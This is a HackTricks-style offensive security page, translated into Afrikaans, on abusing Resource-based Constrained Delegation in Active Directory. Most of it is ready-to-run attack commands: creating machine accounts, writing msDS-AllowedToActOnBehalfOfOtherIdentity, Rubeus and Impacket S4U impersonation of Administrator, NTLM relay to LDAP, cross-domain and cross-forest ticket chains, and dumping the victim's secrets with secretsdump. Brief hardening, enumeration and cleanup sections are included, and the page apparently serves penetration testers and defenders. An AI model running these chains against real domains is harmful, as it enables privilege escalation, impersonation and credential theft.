# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grondbeginsels van Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) is soortgelyk aan [constrained delegation](constrained-delegation.md), maar die vertrouensrigting is omgekeer. Tradisionele constrained delegation teken aan na watter dienste ’n principal mag delegeer; RBCD teken op die **teikenhulpbron** aan watter principals gebruikers daarheen mag naboots.<sup>[[12]](#references)</sup>

Die teikenobjek se _**msDS-AllowedToActOnBehalfOfOtherIdentity**_-kenmerk bevat ’n sekuriteitsbeskrywer wat die principals identifiseer wat namens ander identiteite op daardie hulpbron mag optree.

Nog ’n belangrike verskil is dat ’n principal met voldoende **skryftoestemmings oor ’n masjienrekening** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` en soortgelyke regte) moontlik _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ kan instel. Die opstelling van tradisionele constrained delegation vereis gewoonlik meer bevoorregte administratiewe toegang.<sup>[[1]](#references)</sup>

Meer presies: die verandering van klassieke constrained-delegation-instellings word gewoonlik deur `SeEnableDelegationPrivilege` op ’n domeinbeheerder beperk, ’n reg wat tipies deur hoogs bevoorregte administrateurs besit word. RBCD verskuif die besluit na die teikenobjek se sekuriteitsbeskrywer, dus kan skryftoegang tot die relevante rekenaarobjekkenmerk voldoende wees sonder daardie gebruikersreg.<sup>[[1]](#references)[[2]](#references)</sup>

### Nuwe konsepte

Die **`TrustedToAuthForDelegation`**-vlag in `userAccountControl` word dikwels as ’n voorvereiste vir **S4U2Self** beskryf, maar dit is onvolledig.\
’n Diens-principal met ’n SPN kan S4U2Self sonder die vlag aanvra. Met `TrustedToAuthForDelegation` is die teruggestuurde diensticket **forwardable**; daarsonder is die ticket normaalweg **non-forwardable**.<sup>[[5]](#references)</sup>

Tradisionele constrained delegation verwerp ’n **non-forwardable TGS** in die S4U2Proxy-stap. RBCD kan daardie S4U2Self-ticket aanvaar wanneer die teiken se sekuriteitsbeskrywer die aanvraende diens magtig.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Aanvalstruktuur

> As jy **skryf-ekwivalente voorregte** oor ’n **rekenaarrekening** het, kan jy moontlik bevoorregte toegang tot daardie masjien verkry.

Gestel die aanvaller het reeds **skryf-ekwivalente voorregte oor die slagoffer se rekenaarobjek**.

1. Die aanvaller **kompromitteer** ’n rekening met ’n **SPN** of **skep een** ("Service A"). ’n Geauthentiseerde domeingebruiker kan by verstek tot 10 rekenaarobjekte skep, soos deur **_MachineAccountQuota_** beheer word; ’n rekenaarobjek verskaf outomaties bruikbare SPN’s.
2. Die aanvaller **misbruik sy WRITE-voorreg** oor die slagoffer se rekenaar (ServiceB) om **resource-based constrained delegation op te stel sodat ServiceA enige gebruiker teenoor daardie slagofferrekenaar (ServiceB) kan naboots**.
3. Die aanvaller gebruik Rubeus om ’n **volledige S4U-aanval** (S4U2Self en S4U2Proxy) van Service A na Service B uit te voer vir ’n gebruiker **met bevoorregte toegang tot Service B**.
   1. S4U2Self (vanaf die gekompromitteerde of geskepte SPN-rekening): vra ’n **TGS aan wat Administrator aan Service A verteenwoordig** (non-forwardable).
   2. S4U2Proxy: gebruik daardie **non-forwardable TGS** om ’n diensticket aan te vra wat **Administrator** op die **slagoffer-gasheer** verteenwoordig.
   3. Die non-forwardable ticket kan steeds in hierdie RBCD-vloei werk omdat Service A in die teikenhulpbron se sekuriteitsbeskrywer gemagtig is.
4. Die aanvaller kan **pass-the-ticket** gebruik en die gebruiker **naboots** om **toegang tot die slagoffer se ServiceB** te verkry.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` sluit die verstekroete vir die skep van rekenaars, maar verwyder nie skryftoestemmings oor die teikenrekenaarobjek of beheer oor ’n bestaande rekening nie. ’n Beheerde gewone gebruiker sonder ’n SPN kan soms as die delegerende principal gebruik word deur die [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), ook binne een domein. Daardie roete vereis steeds ’n effektiewe RBCD-skryftoestemming, beheer oor die delegerende gebruiker se geloofsbriewe, ’n nabootsbare identiteit wat gedelegeer mag word, versoenbare Kerberos-enkripsiegedrag en ’n NT-hash-verandering wat die rekening ontwrig. Behandel dit as afsonderlike voorvereistes; ’n leë RBCD-kenmerk of nulkwota bewys op sigself nóg sukses nóg veiligheid.

’n Bestaande RBCD-beskrywer kan ook ’n **groep** noem eerder as die delegerende rekenaar direk. As jy ’n rekenaarrekening met ’n SPN beheer en dit by daardie groep kan voeg, kan die nuwe lidmaatskap die delegasieroete verskaf sonder om die teikenrekenaar se RBCD-kenmerk te verander. Kontroleer die groep se effektiewe ACL vir skryftoestemmings vir lidmaatskap (insluitend deny ACE’s), geneste lidmaatskap en tokenvernuwing, die trustee-SID in die beskrywer, die nagebootste rekening se delegasiebeperkings en die teikendiens se SPN voordat jy besluit of die roete werk.

Om die domein se _**MachineAccountQuota**_ na te gaan, kan jy die volgende gebruik:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Aanval

### Skep van 'n rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep met **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurasie van hulpbron-gebaseerde beperkte delegering

**Gebruik van die Active Directory PowerShell-module**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Gebruik powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### ’n Volledige S4U-aanval uitvoer (Windows/Rubeus)

Eerstens het ons die nuwe Computer-object met die wagwoord `123456` geskep, dus het ons die hash van daardie wagwoord nodig:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Dit sal die RC4- en AES-hashes vir daardie rekening druk.\
Nou kan die aanval uitgevoer word:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Jy kan meer tickets vir meer services genereer deur net een keer te vra met die `/altservice`-parameter van Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Gebruikers kan gemerk word as **"Account is sensitive and cannot be delegated."** As hierdie vlag geaktiveer is, kan die rekening nie deur hierdie delegasievloei nageboots word nie. BloodHound wys hierdie eienskap tydens ontleding.

### Linux-nutsgoed: RBCD van begin tot einde met Impacket (2024+)

As jy vanaf Linux werk, kan jy die volledige RBCD-ketting met die amptelike Impacket-nutsgoed uitvoer:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notas
- As LDAP-signing/LDAPS afgedwing word, gebruik `impacket-rbcd -use-ldaps ...`.
- Verkies AES-sleutels; baie moderne domeine beperk RC4. Impacket en Rubeus ondersteun albei AES-only-vloeie.
- Impacket kan die `sname` ("AnySPN") vir sommige nutsmiddels herskryf, maar verkry waar moontlik die korrekte SPN (bv. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD oor domeine en forests

As die **delegerende principal** wat jy beheer in ’n **ander domein** (of selfs ’n **ander forest**) as die **hulpbronrekenaar** is, is die misbruik steeds **RBCD**, maar die kaartjie-vloei is nie meer die gewone enkel-domein-`S4U2Self -> S4U2Proxy` nie.

### RBCD oor domeine: stel die vreemde principal op met behulp van SID

Wanneer jy `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf ’n **ander domein** stel, kan die vreemde masjien/gebruiker dalk **nie volgens naam** in die LDAP van die teikendomein opgelos word nie. Stel in daardie geval die delegeringsinskrywing op met behulp van die vreemde principal se **SID** in plaas van sy sAMAccountName/UPN.

Dit is veral relevant wanneer NTLM na LDAP gerelay word met `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notas:
- `--sid` sê vir `ntlmrelayx.py` om `--escalate-user` as ’n SID te hanteer, wat nodig is wanneer die delegerende rekening buitelands is ten opsigte van die teikendomein.
- Selfs al wys die nutsprogram `User not found in LDAP`, kan die delegeringsinskrywing steeds slaag omdat die sekuriteitsbeskrywer die buitelandse SID direk stoor.

### Kruisdomein-RBCD: S4U-volgorde oor realm-grense heen

Sodra die buitelandse principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` is, is die werkende kruisdomeinvloei:<sup>[[9]](#references)[[13]](#references)</sup>

1. Kry ’n **TGT** vir die delegerende principal vanaf sy eie domein.
2. Versoek ’n **verwysing-TGT** vir `krbtgt/<target-domain>`.
3. Versoek ’n **S4U2Self-verwysing oor realm-grense heen** vir die gebruiker wat nageboots word, op die teikendomein se DC.
4. Versoek die werklike **S4U2Self**-kaartjie vir daardie gebruiker terug in die delegator-domein.
5. Voer **S4U2Proxy** in die delegator-domein uit om ’n verwysingskaartjie vir die teikendomein te kry.
6. Voer die finale **S4U2Proxy** op die teikendomein se DC uit om die dienskaartjie vir `cifs/host.target`, `host/host.target`, ens. te kry.

Dit is waarom standaard Linux-gereedskap dikwels met kruisdomein-RBCD misluk:<sup>[[9]](#references)</sup>
- die versoek se **realm** moet dalk verskil van die realm van die TGT wat in die `TGS-REQ` gebruik word
- die ketting vereis **onafhanklike S4U2Proxy-stappe**, nie net `S4U2Self` of `S4U2Self` onmiddellik gevolg deur ’n enkele `S4U2Proxy` nie

### Kruisdomein-RBCD vanaf Linux

Synacktiv het ’n Impacket `getST.py`-implementering gepubliseer wat die volgorde oor realm-grense heen vanaf Linux weergee deur die twee KDC’s uitdruklik te hanteer:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operasioneel is die nuwe argumente:
- `-dc-ip`: DC van die **delegerende** domein
- `-targetdomain`: domein van die **hulpbronrekenaar**
- `-targetdc`: DC van die **hulpbron**domein

### Beperkings van RBCD tussen woude

RBCD tussen woude het ’n belangrike beperking: **die nagebootste gebruiker moet aan dieselfde woud as die delegerende principal behoort**. Met ander woorde, as jou beheerde masjienrekening in `valhalla.local` is en die teikenhulpbron in `asgard.local`, kan jy gewoonlik **nie arbitrêre `asgard.local`-gebruikers via RBCD na daardie hulpbron naboots nie**.<sup>[[9]](#references)</sup>

Dit kan steeds uitgebuit word wanneer:
- die gebruiker in die **delegerende woud** ’n **plaaslike admin** (of andersins bevoorreg) op die hulpbron-gasheer in die ander woud is
- ’n trust die vereiste verifikasi pad toelaat en die vreemde SID in die sekuriteitsbeskrywer van die teikenrekenaar aanvaar word

### Protokol-eienaardighede van RBCD tussen woude

RBCD tussen woude is nie bloot “tussen domeine plus ’n trust” nie. Die waargenome vloei sluit twee eienaardighede in wat algemene nutsgoed histories misgekyk het:<sup>[[9]](#references)</sup>

1. ’n Ekstra **S4U2Proxy**-versoek wat **`PA-PAC-OPTIONS=branch-aware`** stel
2. ’n Finale dienskaartjie wat met **RC4** teruggestuur kan word, selfs wanneer ander etipes versoek is

Die praktiese vloei is:

1. Kry ’n TGT vir die delegerende principal in woud A.
2. Versoek **S4U2Self** vir die nagebootste gebruiker in woud A.
3. Versoek **S4U2Proxy** in woud A om ’n verwysing-TGT vir woud B te verkry.
4. Stuur ’n tweede **S4U2Proxy** in woud A **sonder** die S4U2Self-kaartjie as ’n bykomende kaartjie, maar met `branch-aware` geaktiveer, om nog ’n verwysing-TGT vir woud B te verkry.
5. Versoek opsioneel ’n normale dienskaartjie in woud B vir die delegerende principal (hierdie kaartjie is nie nodig vir die finale misbruik nie).
6. Gebruik die verwysingskaartjies van stappe 3 en 4 om die finale **S4U2Proxy**-kaartjie in woud B aan te vra vir die nagebootste gebruiker van woud A na die teiken-SPN.

### RBCD tussen woude vanaf Linux

Dieselfde Synacktiv Impacket-vertakking voeg ’n `-forest`-skakelaar vir hierdie logika by:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekursiewe multi-domein-RBCD (3+ domeine)

In **multi-domeinwoude** kan beide **S4U2Self** en **S4U2Proxy** **rekursief** wees, eerder as om ná een verwysing te stop:

- **Rekursiewe S4U2Self**: die eerste `S4U2Self` word na die **domein van die gebruiker wat nageboots word** gestuur; tussenliggende ouer-/kind-hoppe word met normale `TGS-REQ`-verwysings vir `krbtgt/<REALM>` deurkruis, en die **finale `S4U2Self`** word in die **domein van die gedelegeerde prinsipe** gestuur.
- Dit beteken dat **die blote besit van ’n TGT** vir ’n masjienrekening genoeg kan wees om ’n **admin van ’n ander domein in dieselfde forest** na te boots en `cifs/host`, `host/host`, `wsman/host`, ens. aan te vra.
- **Rekursiewe S4U2Proxy** volg die trustketting op dieselfde manier: tussenliggende hoppe hergebruik die vorige kaartjie as die TGT terwyl die volgende `krbtgt/<REALM>`-verwysing aangevra word; slegs die laaste hop gee die finale dienskaartjie terug.<sup>[[10]](#references)</sup>

’n Praktiese voorbeeld binne dieselfde forest is:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less RBCD oor domeine / forests

As die **delegerende principal 'n gebruiker sonder 'n SPN is**, misluk die laaste rekursiewe `S4U2Self` met **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Die tydelike oplossing is om **slegs die laaste stap as `S4U2Self+U2U` te herhaal**.<sup>[[10]](#references)</sup>

Kort weergawe van die misbruikketting:

1. Outentiseer met die **NT hash** sodat die KDC na **RC4-HMAC (etype 23)** gestuur word.
2. Versoek eers **`-self -u2u`** en hou daardie ticket apart van die latere proxy-stap.
3. Onttrek die **TGT-sessiesleutel** met `describeTicket.py`.
4. Vervang die gebruiker se **NT hash** met daardie **sessiesleutel** deur `changepasswd.py -newhashes <session_key>` te gebruik.
5. Hergebruik die `S4U2Self+U2U`-ticket as die **`-additional-ticket`** tydens 'n afsonderlike **`-proxy`**-versoek.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operasionele voorbehoude:

- Wanneer die **eerste vertroude hop reeds ’n ander forest is**, verkies die **branch-aware** algoritme (`getST.py ... -forest`) om by die oorspronklike Windows-gedrag aan te sluit. As die vreemde forest eers later in die ketting bereik word, kan die nie-branch-aware rekursiewe vloei steeds werk.<sup>[[9]](#references)</sup>
- Op onlangse **Windows Server 2022/2025** DCs kan gedwonge RC4 misluk met **`KDC_ERR_ETYPE_NOSUPP`** weens RC4-deprecation; dit kan **SPN-less RBCD** onmoontlik maak, al werk klassieke SPN-backed RBCD steeds met AES.<sup>[[15]](#references)</sup>
- Voer **`S4U2Self+U2U` uit voordat jy die gebruiker se hash/wagwoord verander**: `SamrChangePasswordUser` herbereken nie die rekening se Kerberos AES-sleutels nie, dus kan ’n wagwoordverandering eerste daaropvolgende kaartjieversoeke laat misluk.<sup>[[14]](#references)</sup>
- Die nagebootste rekening moet steeds **delegable** wees: **Protected Users** en rekeninge met **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokkeer die ketting.

## Notas oor opsporing / verharding

- RBCD-paaie oor domeine/forests word gewoonlik steeds deur **ACL-misbruik** of **relay-to-LDAP** geskep. Dwing **LDAP signing** en **LDAP channel binding** op DCs af om algemene opstellingspaaie te breek.
- Oudit wie `msDS-AllowedToActOnBehalfOfOtherIdentity` op rekenaarobjekte kan skryf, en los die gestoorde SIDs op, insluitend **foreign security principals**.
- In omgewings met baie trusts, hersien **Selective Authentication**, **SID filtering**, en of gebruikers van ’n vreemde forest **local admin**-regte op hulpbron-gashere het.

### Toegang verkry

Die laaste opdragreël voer die **volledige S4U-aanval uit en injecteer die TGS** vanaf Administrator na die slagoffergasheer in **geheue**.\
In hierdie voorbeeld is ’n TGS vir die **CIFS**-diens vanaf Administrator aangevra, dus sal jy toegang tot **C$** kan kry:

```bash
ls \\victim.domain.local\C$
```

### Misbruik verskillende service tickets

Lees meer oor die [**beskikbare service tickets hier**](silver-ticket.md#available-services).

## Enumerering, ouditering en opruiming

### Enumereer rekenaars met RBCD opgestel

PowerShell (dekodeer die SD om SID's op te los):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (lees of maak skoon met een opdrag):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Opruiming / stel RBCD terug

- PowerShell (maak die attribuut skoon):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos-foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos so opgestel is dat dit nie DES of RC4 gebruik nie, en dat jy slegs die RC4-hash verskaf. Verskaf minstens die AES256-hash aan Rubeus (of verskaf bloot die rc4-, aes128- en aes256-hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tydens `-self` vir ’n gewone gebruiker: die delegerende principal het waarskynlik **geen SPN nie**. Probeer die **laaste hop** weer as **`S4U2Self+U2U`** in plaas van ’n gewone `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tydens **SPN-less RBCD**: onlangse DC’s kan die afgedwonge **RC4-HMAC**-roete verwerp wat deur die `S4U2Self+U2U` + session-key-substitution-truuk vereis word. Probeer eerder ’n klassieke **SPN-backed** RBCD-roete met AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd op die huidige rekenaar verskil van dié op die DC, en dat Kerberos nie behoorlik werk nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om aan te meld nie. Jy het dalk vergeet om die "$" by die gebruikersnaam in te sluit toe jy die hashes gegenereer het (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dit kan beteken:
  - Die gebruiker wat jy probeer naboots, kan nie toegang tot die verlangde diens kry nie (omdat jy dit nie kan naboots nie, of omdat dit nie genoeg voorregte het nie)
  - Die aangevraagde diens bestaan nie (as jy ’n kaartjie vir winrm aanvra, maar winrm nie loop nie)
  - Die geskepte fakecomputer het sy voorregte op die kwesbare bediener verloor, en jy moet dit herstel.
  - Jy misbruik klassieke KCD; onthou dat RBCD met nie-aanstuur-bare S4U2Self-kaartjies werk, terwyl KCD aanstuur-bare kaartjies vereis.

## Notas, relays en alternatiewe

- Jy kan die RBCD SD ook via AD Web Services (ADWS) skryf as LDAP gefiltreer word. Sien:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-relaykettings eindig dikwels in RBCD om plaaslike SYSTEM in een stap te verkry. Sien praktiese end-tot-end-voorbeelde:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- As LDAP signing/channel binding **gedeaktiveer** is en jy ’n masjienrekening kan skep, kan tools soos **KrbRelayUp** ’n afgedwonge Kerberos-auth na LDAP relay, `msDS-AllowedToActOnBehalfOfOtherIdentity` vir jou masjienrekening op die teikenrekenaarobjek instel, en **Administrator** onmiddellik via S4U van buite die host naboots.<sup>[[8]](#references)</sup>

## References

- [1] [Die hond swaai: Misbruik van hulpbron-gebaseerde beperkte delegering om Active Directory aan te val](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Nog ’n woord oor delegering – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos-hulpbron-gebaseerde beperkte delegering: Oorname van rekenaarobjekte](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Misbruik van hulpbron-gebaseerde beperkte delegering](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity het die domein doodgemaak: ’n Oorsig van offensiewe Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (amptelik)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Vinnige Linux-cheatsheet met onlangse sintaksis](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing af → Kerberos-relay na RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Verkenning van RBCD oor domeine en forests heen](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Verkenning van RBCD oor domeine en forests heen: deel 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv se Impacket-vertakking - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Oorsig van Kerberos-beperkte delegering](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self oor domeine heen](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Bespeur en herstel RC4-gebruik in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Besonderhede oor S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
